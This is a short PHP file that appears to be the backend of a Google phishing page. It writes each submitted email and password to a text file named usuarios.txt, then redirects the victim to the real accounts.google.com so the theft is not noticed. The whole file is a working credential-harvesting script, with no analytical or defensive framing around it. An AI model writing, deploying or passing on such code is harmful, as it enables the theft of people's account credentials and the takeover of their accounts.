<?php

file_put_contents("usuarios.txt", "Google User: " . $_POST['email'] . " Password: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com');
exit();
?>
